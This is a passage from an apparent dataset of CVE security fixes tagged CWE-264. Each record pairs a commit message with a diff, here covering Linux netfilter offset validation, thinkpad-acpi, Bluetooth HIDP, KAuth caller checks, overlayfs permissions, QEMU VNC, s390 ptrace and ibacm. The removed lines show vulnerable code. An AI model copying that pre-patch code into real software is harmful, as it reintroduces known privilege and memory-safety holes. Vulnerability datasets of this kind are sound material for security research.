net\/ipv6\/netfilter\/ip6_tables.c    |  5 +++--\n net\/netfilter\/x_tables.c           | 17 +++++++++++++++--\n 5 files changed, 26 insertions(+), 10 deletions(-)\n\n","diff_code":"diff --git a\/include\/linux\/netfilter\/x_tables.h b\/include\/linux\/netfilter\/x_tables.h\nindex 08de48bbe92e..30cfb1e943fb 100644\n--- a\/include\/linux\/netfilter\/x_tables.h\n+++ b\/include\/linux\/netfilter\/x_tables.h\n@@ -242,7 +242,7 @@ void xt_unregister_match(struct xt_match *target);\n int xt_register_matches(struct xt_match *match, unsigned int n);\n void xt_unregister_matches(struct xt_match *match, unsigned int n);\n \n-int xt_check_entry_offsets(const void *base,\n+int xt_check_entry_offsets(const void *base, const char *elems,\n \t\t\t   unsigned int target_offset,\n \t\t\t   unsigned int next_offset);\n \n@@ -494,7 +494,7 @@ void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,\n \t\t\t\tunsigned int *size);\n int xt_compat_target_to_user(const struct xt_entry_target *t,\n \t\t\t     void __user **dstptr, unsigned int *size);\n-int xt_compat_check_entry_offsets(const void *base,\n+int xt_compat_check_entry_offsets(const void *base, const char *elems,\n \t\t\t\t  unsigned int target_offset,\n \t\t\t\t  unsigned int next_offset);\n \ndiff --git a\/net\/ipv4\/netfilter\/arp_tables.c b\/net\/ipv4\/netfilter\/arp_tables.c\nindex ab8952a49bfa..95ed4e454c60 100644\n--- a\/net\/ipv4\/netfilter\/arp_tables.c\n+++ b\/net\/ipv4\/netfilter\/arp_tables.c\n@@ -592,7 +592,8 @@ static inline int check_entry_size_and_hooks(struct arpt_entry *e,\n \tif (!arp_checkentry(&e->arp))\n \t\treturn -EINVAL;\n \n-\terr = xt_check_entry_offsets(e, e->target_offset, e->next_offset);\n+\terr = xt_check_entry_offsets(e, e->elems, e->target_offset,\n+\t\t\t\t     e->next_offset);\n \tif (err)\n \t\treturn err;\n \n@@ -1254,7 +1255,7 @@ check_compat_entry_size_and_hooks(struct compat_arpt_entry *e,\n \tif (!arp_checkentry(&e->arp))\n \t\treturn -EINVAL;\n \n-\tret = xt_compat_check_entry_offsets(e, e->target_offset,\n+\tret = xt_compat_check_entry_offsets(e, e->elems, e->target_offset,\n \t\t\t\t\t    e->next_offset);\n \tif (ret)\n \t\treturn ret;\ndiff --git a\/net\/ipv4\/netfilter\/ip_tables.c b\/net\/ipv4\/netfilter\/ip_tables.c\nindex 7d24c872723f..baab033d74e0 100644\n--- a\/net\/ipv4\/netfilter\/ip_tables.c\n+++ b\/net\/ipv4\/netfilter\/ip_tables.c\n@@ -754,7 +754,8 @@ check_entry_size_and_hooks(struct ipt_entry *e,\n \tif (!ip_checkentry(&e->ip))\n \t\treturn -EINVAL;\n \n-\terr = xt_check_entry_offsets(e, e->target_offset, e->next_offset);\n+\terr = xt_check_entry_offsets(e, e->elems, e->target_offset,\n+\t\t\t\t     e->next_offset);\n \tif (err)\n \t\treturn err;\n \n@@ -1513,7 +1514,7 @@ check_compat_entry_size_and_hooks(struct compat_ipt_entry *e,\n \tif (!ip_checkentry(&e->ip))\n \t\treturn -EINVAL;\n \n-\tret = xt_compat_check_entry_offsets(e,\n+\tret = xt_compat_check_entry_offsets(e, e->elems,\n \t\t\t\t\t    e->target_offset, e->next_offset);\n \tif (ret)\n \t\treturn ret;\ndiff --git a\/net\/ipv6\/netfilter\/ip6_tables.c b\/net\/ipv6\/netfilter\/ip6_tables.c\nindex 73eee7b5fd60..6957627c7931 100644\n--- a\/net\/ipv6\/netfilter\/ip6_tables.c\n+++ b\/net\/ipv6\/netfilter\/ip6_tables.c\n@@ -766,7 +766,8 @@ check_entry_size_and_hooks(struct ip6t_entry *e,\n \tif (!ip6_checkentry(&e->ipv6))\n \t\treturn -EINVAL;\n \n-\terr = xt_check_entry_offsets(e, e->target_offset, e->next_offset);\n+\terr = xt_check_entry_offsets(e, e->elems, e->target_offset,\n+\t\t\t\t     e->next_offset);\n \tif (err)\n \t\treturn err;\n \n@@ -1525,7 +1526,7 @@ check_compat_entry_size_and_hooks(struct compat_ip6t_entry *e,\n \tif (!ip6_checkentry(&e->ipv6))\n \t\treturn -EINVAL;\n \n-\tret = xt_compat_check_entry_offsets(e,\n+\tret = xt_compat_check_entry_offsets(e, e->elems,\n \t\t\t\t\t    e->target_offset, e->next_offset);\n \tif (ret)\n \t\treturn ret;\ndiff --git a\/net\/netfilter\/x_tables.c b\/net\/netfilter\/x_tables.c\nindex 1cb7a271c024..e2a6f2a9051b 100644\n--- a\/net\/netfilter\/x_tables.c\n+++ b\/net\/netfilter\/x_tables.c\n@@ -546,14 +546,17 @@ struct compat_xt_standard_target {\n \tcompat_uint_t verdict;\n };\n \n-\/* see xt_check_entry_offsets *\/\n-int xt_compat_check_entry_offsets(const void *base,\n+int xt_compat_check_entry_offsets(const void *base, const char *elems,\n \t\t\t\t  unsigned int target_offset,\n \t\t\t\t  unsigned int next_offset)\n {\n+\tlong size_of_base_struct = elems - (const char *)base;\n \tconst struct compat_xt_entry_target *t;\n \tconst char *e = base;\n \n+\tif (target_offset < size_of_base_struct)\n+\t\treturn -EINVAL;\n+\n \tif (target_offset + sizeof(*t) > next_offset)\n \t\treturn -EINVAL;\n \n@@ -577,12 +580,16 @@ EXPORT_SYMBOL(xt_compat_check_entry_offsets);\n  * xt_check_entry_offsets - validate arp\/ip\/ip6t_entry\n  *\n  * @base: pointer to arp\/ip\/ip6t_entry\n+ * @elems: pointer to first xt_entry_match, i.e. ip(6)t_entry->elems\n  * @target_offset: the arp\/ip\/ip6_t->target_offset\n  * @next_offset: the arp\/ip\/ip6_t->next_offset\n  *\n  * validates that target_offset and next_offset are sane.\n  * Also see xt_compat_check_entry_offsets for CONFIG_COMPAT version.\n  *\n+ * This function does not validate the targets or matches themselves, it\n+ * only tests that all the offsets and sizes are correct.\n+ *\n  * The arp\/ip\/ip6t_entry structure @base must have passed following tests:\n  * - it must point to a valid memory location\n  * - base to base + next_offset must be accessible, i.e. not exceed allocated\n@@ -591,12 +598,18 @@ EXPORT_SYMBOL(xt_compat_check_entry_offsets);\n  * Return: 0 on success, negative errno on failure.\n  *\/\n int xt_check_entry_offsets(const void *base,\n+\t\t\t   const char *elems,\n \t\t\t   unsigned int target_offset,\n \t\t\t   unsigned int next_offset)\n {\n+\tlong size_of_base_struct = elems - (const char *)base;\n \tconst struct xt_entry_target *t;\n \tconst char *e = base;\n \n+\t\/* target start is within the ip\/ip6\/arpt_entry struct *\/\n+\tif (target_offset < size_of_base_struct)\n+\t\treturn -EINVAL;\n+\n \tif (target_offset + sizeof(*t) > next_offset)\n \t\treturn -EINVAL;\n \n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2010-3448","CWE_ID":"264","category":"security","commit_id":"b525c06cdbd8a3963f0173ccd23f9147d4c384b5","commit_message":"From b525c06cdbd8a3963f0173ccd23f9147d4c384b5 Mon Sep 17 00:00:00 2001\nFrom: Henrique de Moraes Holschuh <hmh@hmh.eng.br>\nDate: Thu, 25 Feb 2010 22:22:22 -0300\nSubject: thinkpad-acpi: lock down video output state access\n\nGiven the right combination of ThinkPad and X.org, just reading the\nvideo output control state is enough to hard-crash X.org.\n\nUntil the day I somehow find out a model or BIOS cut date to not\nprovide this feature to ThinkPads that can do video switching through\nX RandR, change permissions so that only processes with CAP_SYS_ADMIN\ncan access any sort of video output control state.\n\nThis bug could be considered a local DoS I suppose, as it allows any\nnon-privledged local user to cause some versions of X.org to\nhard-crash some ThinkPads.\n\nReported-by: Jidanni <jidanni@jidanni.org>\nSigned-off-by: Henrique de Moraes Holschuh <hmh@hmh.eng.br>\nCc: stable@kernel.org\n---\n Documentation\/laptops\/thinkpad-acpi.txt |  4 ++++\n drivers\/platform\/x86\/Kconfig            | 10 ++++++++--\n drivers\/platform\/x86\/thinkpad_acpi.c    | 15 +++++++++++++--\n 3 files changed, 25 insertions(+), 4 deletions(-)\n\n","diff_code":"diff --git a\/Documentation\/laptops\/thinkpad-acpi.txt b\/Documentation\/laptops\/thinkpad-acpi.txt\nindex 75afa1229fd7..39c0a09d0105 100644\n--- a\/Documentation\/laptops\/thinkpad-acpi.txt\n+++ b\/Documentation\/laptops\/thinkpad-acpi.txt\n@@ -650,6 +650,10 @@ LCD, CRT or DVI (if available). The following commands are available:\n \techo expand_toggle > \/proc\/acpi\/ibm\/video\n \techo video_switch > \/proc\/acpi\/ibm\/video\n \n+NOTE: Access to this feature is restricted to processes owning the\n+CAP_SYS_ADMIN capability for safety reasons, as it can interact badly\n+enough with some versions of X.org to crash it.\n+\n Each video output device can be enabled or disabled individually.\n Reading \/proc\/acpi\/ibm\/video shows the status of each device.\n \ndiff --git a\/drivers\/platform\/x86\/Kconfig b\/drivers\/platform\/x86\/Kconfig\nindex f526e735c5ab..11fce79b61d1 100644\n--- a\/drivers\/platform\/x86\/Kconfig\n+++ b\/drivers\/platform\/x86\/Kconfig\n@@ -319,9 +319,15 @@ config THINKPAD_ACPI_VIDEO\n \t  server running, phase of the moon, and the current mood of\n \t  Schroedinger's cat.  If you can use X.org's RandR to control\n \t  your ThinkPad's video output ports instead of this feature,\n-\t  don't think twice: do it and say N here to save some memory.\n+\t  don't think twice: do it and say N here to save memory and avoid\n+\t  bad interactions with X.org.\n \n-\t  If you are not sure, say Y here.\n+\t  NOTE: access to this feature is limited to processes with the\n+\t  CAP_SYS_ADMIN capability, to avoid local DoS issues in platforms\n+\t  where it interacts badly with X.org.\n+\n+\t  If you are not sure, say Y here but do try to check if you could\n+\t  be using X.org RandR instead.\n \n config THINKPAD_ACPI_HOTKEY_POLL\n \tbool \"Support NVRAM polling for hot keys\"\ndiff --git a\/drivers\/platform\/x86\/thinkpad_acpi.c b\/drivers\/platform\/x86\/thinkpad_acpi.c\nindex 3af4628d7dd1..5d02cc06d1a7 100644\n--- a\/drivers\/platform\/x86\/thinkpad_acpi.c\n+++ b\/drivers\/platform\/x86\/thinkpad_acpi.c\n@@ -286,6 +286,7 @@ struct ibm_init_struct {\n \tchar param[32];\n \n \tint (*init) (struct ibm_init_struct *);\n+\tmode_t base_procfs_mode;\n \tstruct ibm_struct *data;\n };\n \n@@ -4629,6 +4630,10 @@ static int video_read(struct seq_file *m)\n \t\treturn 0;\n \t}\n \n+\t\/* Even reads can crash X.org, so... *\/\n+\tif (!capable(CAP_SYS_ADMIN))\n+\t\treturn -EPERM;\n+\n \tstatus = video_outputsw_get();\n \tif (status < 0)\n \t\treturn status;\n@@ -4662,6 +4667,10 @@ static int video_write(char *buf)\n \tif (video_supported == TPACPI_VIDEO_NONE)\n \t\treturn -ENODEV;\n \n+\t\/* Even reads can crash X.org, let alone writes... *\/\n+\tif (!capable(CAP_SYS_ADMIN))\n+\t\treturn -EPERM;\n+\n \tenable = 0;\n \tdisable = 0;\n \n@@ -8487,9 +8496,10 @@ static int __init ibm_init(struct ibm_init_struct *iibm)\n \t\t\"%s installed\\n\", ibm->name);\n \n \tif (ibm->read) {\n-\t\tmode_t mode;\n+\t\tmode_t mode = iibm->base_procfs_mode;\n \n-\t\tmode = S_IRUGO;\n+\t\tif (!mode)\n+\t\t\tmode = S_IRUGO;\n \t\tif (ibm->write)\n \t\t\tmode |= S_IWUSR;\n \t\tentry = proc_create_data(ibm->name, mode, proc_dir,\n@@ -8680,6 +8690,7 @@ static struct ibm_init_struct ibms_init[] __initdata = {\n #ifdef CONFIG_THINKPAD_ACPI_VIDEO\n \t{\n \t\t.init = video_init,\n+\t\t.base_procfs_mode = S_IRUSR,\n \t\t.data = &video_driver_data,\n \t},\n #endif\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2017-13220","CWE_ID":"264","category":"security","commit_id":"51bda2bca53b265715ca1852528f38dc67429d9a","commit_message":"From 51bda2bca53b265715ca1852528f38dc67429d9a Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@zeniv.linux.org.uk>\nDate: Fri, 19 Dec 2014 06:20:57 +0000\nSubject: Bluetooth: hidp_connection_add() unsafe use of l2cap_pi()\n\nit's OK after we'd verified the sockets, but not before that.\n\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\nSigned-off-by: Marcel Holtmann <marcel@holtmann.org>\n---\n net\/bluetooth\/hidp\/core.c | 3 ++-\n 1 file changed, 2 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/net\/bluetooth\/hidp\/core.c b\/net\/bluetooth\/hidp\/core.c\nindex cc25d0b74b36..07348e142f16 100644\n--- a\/net\/bluetooth\/hidp\/core.c\n+++ b\/net\/bluetooth\/hidp\/core.c\n@@ -1314,13 +1314,14 @@ int hidp_connection_add(struct hidp_connadd_req *req,\n {\n \tstruct hidp_session *session;\n \tstruct l2cap_conn *conn;\n-\tstruct l2cap_chan *chan = l2cap_pi(ctrl_sock->sk)->chan;\n+\tstruct l2cap_chan *chan;\n \tint ret;\n \n \tret = hidp_verify_sockets(ctrl_sock, intr_sock);\n \tif (ret)\n \t\treturn ret;\n \n+\tchan = l2cap_pi(ctrl_sock->sk)->chan;\n \tconn = NULL;\n \tl2cap_chan_lock(chan);\n \tif (chan->conn)\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2017-8422","CWE_ID":"264","category":"security","commit_id":"df875f725293af53399f5146362eb158b4f9216a","commit_message":"From df875f725293af53399f5146362eb158b4f9216a Mon Sep 17 00:00:00 2001\nFrom: Albert Astals Cid <aacid@kde.org>\nDate: Wed, 10 May 2017 10:03:45 +0200\nSubject: Verify that whoever is calling us is actually who he says he is\n\nCVE-2017-8422\n---\n src\/AuthBackend.cpp                         |  5 +++++\n src\/AuthBackend.h                           |  7 +++++++\n src\/backends\/dbus\/DBusHelperProxy.cpp       | 27 +++++++++++++++++++++++++--\n src\/backends\/dbus\/DBusHelperProxy.h         |  6 +++++-\n src\/backends\/policykit\/PolicyKitBackend.cpp |  5 +++++\n src\/backends\/policykit\/PolicyKitBackend.h   |  1 +\n src\/backends\/polkit-1\/Polkit1Backend.cpp    |  5 +++++\n src\/backends\/polkit-1\/Polkit1Backend.h      |  1 +\n 8 files changed, 54 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/src\/AuthBackend.cpp b\/src\/AuthBackend.cpp\nindex a41d4f1..a847494 100644\n--- a\/src\/AuthBackend.cpp\n+++ b\/src\/AuthBackend.cpp\n@@ -54,6 +54,11 @@ void AuthBackend::setCapabilities(AuthBackend::Capabilities capabilities)\n     d->capabilities = capabilities;\n }\n \n+AuthBackend::ExtraCallerIDVerificationMethod AuthBackend::extraCallerIDVerificationMethod() const\n+{\n+    return NoExtraCallerIDVerificationMethod;\n+}\n+\n bool AuthBackend::actionExists(const QString &action)\n {\n     Q_UNUSED(action);\ndiff --git a\/src\/AuthBackend.h b\/src\/AuthBackend.h\nindex c67a706..09195ef 100644\n--- a\/src\/AuthBackend.h\n+++ b\/src\/AuthBackend.h\n@@ -43,6 +43,12 @@ public:\n     };\n     Q_DECLARE_FLAGS(Capabilities, Capability)\n \n+    enum ExtraCallerIDVerificationMethod {\n+        NoExtraCallerIDVerificationMethod,\n+        VerifyAgainstDBusServiceName,\n+        VerifyAgainstDBusServicePid,\n+    };\n+\n     AuthBackend();\n     virtual ~AuthBackend();\n     virtual void setupAction(const QString &action) = 0;\n@@ -50,6 +56,7 @@ public:\n     virtual Action::AuthStatus authorizeAction(const QString &action) = 0;\n     virtual Action::AuthStatus actionStatus(const QString &action) = 0;\n     virtual QByteArray callerID() const = 0;\n+    virtual ExtraCallerIDVerificationMethod extraCallerIDVerificationMethod() const;\n     virtual bool isCallerAuthorized(const QString &action, QByteArray callerID) = 0;\n     virtual bool actionExists(const QString &action);\n \ndiff --git a\/src\/backends\/dbus\/DBusHelperProxy.cpp b\/src\/backends\/dbus\/DBusHelperProxy.cpp\nindex 9c5cb96..3c1c108 100644\n--- a\/src\/backends\/dbus\/DBusHelperProxy.cpp\n+++ b\/src\/backends\/dbus\/DBusHelperProxy.cpp\n@@ -235,6 +235,29 @@ bool DBusHelperProxy::hasToStopAction()\n     return m_stopRequest;\n }\n \n+bool DBusHelperProxy::isCallerAuthorized(const QString &action, const QByteArray &callerID)\n+{\n+    \/\/ Check the caller is really who it says it is\n+    switch (BackendsManager::authBackend()->extraCallerIDVerificationMethod()) {\n+        case AuthBackend::NoExtraCallerIDVerificationMethod:\n+        break;\n+\n+        case AuthBackend::VerifyAgainstDBusServiceName:\n+            if (message().service().toUtf8() != callerID) {\n+                return false;\n+            }\n+        break;\n+\n+        case AuthBackend::VerifyAgainstDBusServicePid:\n+            if (connection().interface()->servicePid(message().service()).value() != callerID.toUInt()) {\n+                return false;\n+            }\n+        break;\n+    }\n+\n+    return BackendsManager::authBackend()->isCallerAuthorized(action, callerID);\n+}\n+\n QByteArray DBusHelperProxy::performAction(const QString &action, const QByteArray &callerID, QByteArray arguments)\n {\n     if (!responder) {\n@@ -259,7 +282,7 @@ QByteArray DBusHelperProxy::performAction(const QString &action, const QByteArra\n     QTimer *timer = responder->property(\"__KAuth_Helper_Shutdown_Timer\").value<QTimer *>();\n     timer->stop();\n \n-    if (BackendsManager::authBackend()->isCallerAuthorized(action, callerID)) {\n+    if (isCallerAuthorized(action, callerID)) {\n         QString slotname = action;\n         if (slotname.startsWith(m_name + QLatin1Char('.'))) {\n             slotname = slotname.right(slotname.length() - m_name.length() - 1);\n@@ -301,7 +324,7 @@ uint DBusHelperProxy::authorizeAction(const QString &action, const QByteArray &c\n     QTimer *timer = responder->property(\"__KAuth_Helper_Shutdown_Timer\").value<QTimer *>();\n     timer->stop();\n \n-    if (BackendsManager::authBackend()->isCallerAuthorized(action, callerID)) {\n+    if (isCallerAuthorized(action, callerID)) {\n         retVal = static_cast<uint>(Action::AuthorizedStatus);\n     } else {\n         retVal = static_cast<uint>(Action::DeniedStatus);\ndiff --git a\/src\/backends\/dbus\/DBusHelperProxy.h b\/src\/backends\/dbus\/DBusHelperProxy.h\nindex 52b0ac4..82cec5a 100644\n--- a\/src\/backends\/dbus\/DBusHelperProxy.h\n+++ b\/src\/backends\/dbus\/DBusHelperProxy.h\n@@ -25,12 +25,13 @@\n #include \"kauthactionreply.h\"\n \n #include <QDBusConnection>\n+#include <QDBusContext>\n #include <QVariant>\n \n namespace KAuth\n {\n \n-class DBusHelperProxy : public HelperProxy\n+class DBusHelperProxy : public HelperProxy, protected QDBusContext\n {\n     Q_OBJECT\n     Q_PLUGIN_METADATA(IID \"org.kde.DBusHelperProxy\")\n@@ -79,6 +80,9 @@ Q_SIGNALS:\n \n private Q_SLOTS:\n     void remoteSignalReceived(int type, const QString &action, QByteArray blob);\n+\n+private:\n+    bool isCallerAuthorized(const QString &action, const QByteArray &callerID);\n };\n \n } \/\/ namespace Auth\ndiff --git a\/src\/backends\/policykit\/PolicyKitBackend.cpp b\/src\/backends\/policykit\/PolicyKitBackend.cpp\nindex c2b4d42..bf038a8 100644\n--- a\/src\/backends\/policykit\/PolicyKitBackend.cpp\n+++ b\/src\/backends\/policykit\/PolicyKitBackend.cpp\n@@ -78,6 +78,11 @@ QByteArray PolicyKitBackend::callerID() const\n     return a;\n }\n \n+AuthBackend::ExtraCallerIDVerificationMethod Polkit1Backend::extraCallerIDVerificationMethod() const\n+{\n+    return VerifyAgainstDBusServicePid;\n+}\n+\n bool PolicyKitBackend::isCallerAuthorized(const QString &action, QByteArray callerID)\n {\n     QDataStream s(&callerID, QIODevice::ReadOnly);\ndiff --git a\/src\/backends\/policykit\/PolicyKitBackend.h b\/src\/backends\/policykit\/PolicyKitBackend.h\nindex eb17a3a..38b0240 100644\n--- a\/src\/backends\/policykit\/PolicyKitBackend.h\n+++ b\/src\/backends\/policykit\/PolicyKitBackend.h\n@@ -40,6 +40,7 @@ public:\n     virtual Action::AuthStatus authorizeAction(const QString &);\n     virtual Action::AuthStatus actionStatus(const QString &);\n     virtual QByteArray callerID() const;\n+    ExtraCallerIDVerificationMethod extraCallerIDVerificationMethod() const Q_DECL_OVERRIDE;\n     virtual bool isCallerAuthorized(const QString &action, QByteArray callerID);\n \n private Q_SLOTS:\ndiff --git a\/src\/backends\/polkit-1\/Polkit1Backend.cpp b\/src\/backends\/polkit-1\/Polkit1Backend.cpp\nindex 78ee5bb..774588c 100644\n--- a\/src\/backends\/polkit-1\/Polkit1Backend.cpp\n+++ b\/src\/backends\/polkit-1\/Polkit1Backend.cpp\n@@ -162,6 +162,11 @@ QByteArray Polkit1Backend::callerID() const\n         return QDBusConnection::systemBus().baseService().toUtf8();\n }\n \n+AuthBackend::ExtraCallerIDVerificationMethod Polkit1Backend::extraCallerIDVerificationMethod() const\n+{\n+    return VerifyAgainstDBusServiceName;\n+}\n+\n bool Polkit1Backend::isCallerAuthorized(const QString &action, QByteArray callerID)\n {\n     PolkitQt1::SystemBusNameSubject subject(QString::fromUtf8(callerID));\ndiff --git a\/src\/backends\/polkit-1\/Polkit1Backend.h b\/src\/backends\/polkit-1\/Polkit1Backend.h\nindex d7d1e3a..2357892 100644\n--- a\/src\/backends\/polkit-1\/Polkit1Backend.h\n+++ b\/src\/backends\/polkit-1\/Polkit1Backend.h\n@@ -49,6 +49,7 @@ public:\n     Action::AuthStatus authorizeAction(const QString &) Q_DECL_OVERRIDE;\n     Action::AuthStatus actionStatus(const QString &) Q_DECL_OVERRIDE;\n     QByteArray callerID() const Q_DECL_OVERRIDE;\n+    ExtraCallerIDVerificationMethod extraCallerIDVerificationMethod() const Q_DECL_OVERRIDE;\n     bool isCallerAuthorized(const QString &action, QByteArray callerID) Q_DECL_OVERRIDE;\n     bool actionExists(const QString &action) Q_DECL_OVERRIDE;\n \n-- \ncgit v1.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2018-16597","CWE_ID":"264","category":"security","commit_id":"c0ca3d70e8d3cf81e2255a217f7ca402f5ed0862","commit_message":"From c0ca3d70e8d3cf81e2255a217f7ca402f5ed0862 Mon Sep 17 00:00:00 2001\nFrom: Vivek Goyal <vgoyal@redhat.com>\nDate: Fri, 1 Jul 2016 16:34:27 -0400\nSubject: ovl: modify ovl_permission() to do checks on two inodes\n\nRight now ovl_permission() calls __inode_permission(realinode), to do\npermission checks on real inode and no checks are done on overlay inode.\n\nModify it to do checks both on overlay inode as well as underlying inode.\nChecks on overlay inode will be done with the creds of calling task while\nchecks on underlying inode will be done with the creds of mounter.\n\nSigned-off-by: Vivek Goyal <vgoyal@redhat.com>\nSigned-off-by: Miklos Szeredi <mszeredi@redhat.com>\n---\n fs\/overlayfs\/inode.c | 18 ++++++++++++++----\n 1 file changed, 14 insertions(+), 4 deletions(-)\n\n","diff_code":"diff --git a\/fs\/overlayfs\/inode.c b\/fs\/overlayfs\/inode.c\nindex a574108f52a8..f84492ff505d 100644\n--- a\/fs\/overlayfs\/inode.c\n+++ b\/fs\/overlayfs\/inode.c\n@@ -113,6 +113,7 @@ int ovl_permission(struct inode *inode, int mask)\n \tbool is_upper;\n \tstruct dentry *realdentry = ovl_entry_real(oe, &is_upper);\n \tstruct inode *realinode;\n+\tconst struct cred *old_cred;\n \tint err;\n \n \tif (ovl_is_default_permissions(inode)) {\n@@ -166,7 +167,19 @@ int ovl_permission(struct inode *inode, int mask)\n \t\t\treturn -EROFS;\n \t}\n \n-\treturn __inode_permission(realinode, mask);\n+\t\/*\n+\t * Check overlay inode with the creds of task and underlying inode\n+\t * with creds of mounter\n+\t *\/\n+\terr = generic_permission(inode, mask);\n+\tif (err)\n+\t\treturn err;\n+\n+\told_cred = ovl_override_creds(inode->i_sb);\n+\terr = __inode_permission(realinode, mask);\n+\trevert_creds(old_cred);\n+\n+\treturn err;\n }\n \n static const char *ovl_get_link(struct dentry *dentry,\n@@ -314,9 +327,6 @@ struct posix_acl *ovl_get_acl(struct inode *inode, int type)\n {\n \tstruct inode *realinode = ovl_inode_real(inode);\n \n-\tif (!realinode)\n-\t\treturn ERR_PTR(-ENOENT);\n-\n \tif (!IS_POSIXACL(realinode))\n \t\treturn NULL;\n \n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-7815","CWE_ID":"264","category":"security","commit_id":"e6908bfe8e07f2b452e78e677da1b45b1c0f6829","commit_message":"From e6908bfe8e07f2b452e78e677da1b45b1c0f6829 Mon Sep 17 00:00:00 2001\nFrom: Petr Matousek <pmatouse@redhat.com>\nDate: Mon, 27 Oct 2014 12:41:44 +0100\nSubject: [PATCH] vnc: sanitize bits_per_pixel from the client\n\nbits_per_pixel that are less than 8 could result in accessing\nnon-initialized buffers later in the code due to the expectation\nthat bytes_per_pixel value that is used to initialize these buffers is\nnever zero.\n\nTo fix this check that bits_per_pixel from the client is one of the\nvalues that the rfb protocol specification allows.\n\nThis is CVE-2014-7815.\n\nSigned-off-by: Petr Matousek <pmatouse@redhat.com>\n\n[ kraxel: apply codestyle fix ]\n\nSigned-off-by: Gerd Hoffmann <kraxel@redhat.com>\n---\n ui\/vnc.c | 10 ++++++++++\n 1 file changed, 10 insertions(+)\n\n","diff_code":"diff --git a\/ui\/vnc.c b\/ui\/vnc.c\nindex 0fe6eff..8bca597 100644\n--- a\/ui\/vnc.c\n+++ b\/ui\/vnc.c\n@@ -2026,6 +2026,16 @@ static void set_pixel_format(VncState *vs,\n         return;\n     }\n \n+    switch (bits_per_pixel) {\n+    case 8:\n+    case 16:\n+    case 32:\n+        break;\n+    default:\n+        vnc_client_error(vs);\n+        return;\n+    }\n+\n     vs->client_pf.rmax = red_max;\n     vs->client_pf.rbits = hweight_long(red_max);\n     vs->client_pf.rshift = red_shift;\n-- \n1.8.3.1\n\n","owner":"qemu","repo":"qemu","source":"cve"},{"CVE_ID":"CVE-2014-3534","CWE_ID":"264","category":"security","commit_id":"dab6cf55f81a6e16b8147aed9a843e1691dcd318","commit_message":"From dab6cf55f81a6e16b8147aed9a843e1691dcd318 Mon Sep 17 00:00:00 2001\nFrom: Martin Schwidefsky <schwidefsky@de.ibm.com>\nDate: Mon, 23 Jun 2014 15:29:40 +0200\nSubject: [PATCH] s390\/ptrace: fix PSW mask check\n\nThe PSW mask check of the PTRACE_POKEUSR_AREA command is incorrect.\nThe PSW_MASK_USER define contains the PSW_MASK_ASC bits, the ptrace\ninterface accepts all combinations for the address-space-control\nbits. To protect the kernel space the PSW mask check in ptrace needs\nto reject the address-space-control bit combination for home space.\n\nFixes CVE-2014-3534\n\nCc: stable@vger.kernel.org\nSigned-off-by: Martin Schwidefsky <schwidefsky@de.ibm.com>\n---\n arch\/s390\/kernel\/ptrace.c | 12 ++++++++++--\n 1 file changed, 10 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/arch\/s390\/kernel\/ptrace.c b\/arch\/s390\/kernel\/ptrace.c\nindex 2d716734b5b1b..5dc7ad9e2fbf2 100644\n--- a\/arch\/s390\/kernel\/ptrace.c\n+++ b\/arch\/s390\/kernel\/ptrace.c\n@@ -334,9 +334,14 @@ static int __poke_user(struct task_struct *child, addr_t addr, addr_t data)\n \t\t\tunsigned long mask = PSW_MASK_USER;\n \n \t\t\tmask |= is_ri_task(child) ? PSW_MASK_RI : 0;\n-\t\t\tif ((data & ~mask) != PSW_USER_BITS)\n+\t\t\tif ((data ^ PSW_USER_BITS) & ~mask)\n+\t\t\t\t\/* Invalid psw mask. *\/\n+\t\t\t\treturn -EINVAL;\n+\t\t\tif ((data & PSW_MASK_ASC) == PSW_ASC_HOME)\n+\t\t\t\t\/* Invalid address-space-control bits *\/\n \t\t\t\treturn -EINVAL;\n \t\t\tif ((data & PSW_MASK_EA) && !(data & PSW_MASK_BA))\n+\t\t\t\t\/* Invalid addressing mode bits *\/\n \t\t\t\treturn -EINVAL;\n \t\t}\n \t\t*(addr_t *)((addr_t) &task_pt_regs(child)->psw + addr) = data;\n@@ -672,9 +677,12 @@ static int __poke_user_compat(struct task_struct *child,\n \n \t\t\tmask |= is_ri_task(child) ? PSW32_MASK_RI : 0;\n \t\t\t\/* Build a 64 bit psw mask from 31 bit mask. *\/\n-\t\t\tif ((tmp & ~mask) != PSW32_USER_BITS)\n+\t\t\tif ((tmp ^ PSW32_USER_BITS) & ~mask)\n \t\t\t\t\/* Invalid psw mask. *\/\n \t\t\t\treturn -EINVAL;\n+\t\t\tif ((data & PSW32_MASK_ASC) == PSW32_ASC_HOME)\n+\t\t\t\t\/* Invalid address-space-control bits *\/\n+\t\t\t\treturn -EINVAL;\n \t\t\tregs->psw.mask = (regs->psw.mask & ~PSW_MASK_USER) |\n \t\t\t\t(regs->psw.mask & PSW_MASK_BA) |\n \t\t\t\t(__u64)(tmp & mask) << 32;\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2012-4518","CWE_ID":"264","category":"security","commit_id":"d204fca2b6298d7799e918141ea8e11e7ad43cec","commit_message":"From d204fca2b6298d7799e918141ea8e11e7ad43cec Mon Sep 17 00:00:00 2001\nFrom: Sean Hefty <sean.hefty@intel.com>\nDate: Tue, 9 Oct 2012 11:33:27 -0700\nSubject: [PATCH] ibacm: Remove umask(0)\n\nThis causes ibacm files to be created as world writable.\n\nProblem reported by Florian Weimer <fweimer@redhat.com>\n\nSigned-off-by: Sean Hefty <sean.hefty@intel.com>\n---\n src\/acm.c | 2 --\n 1 file changed, 2 deletions(-)\n\n","diff_code":"diff --git a\/src\/acm.c b\/src\/acm.c\nindex 00fc35d..725cde2 100644\n--- a\/src\/acm.c\n+++ b\/src\/acm.c\n@@ -3182,8 +3182,6 @@ static void daemonize(void)\n \tif (pid)\n \t\texit(pid < 0);\n 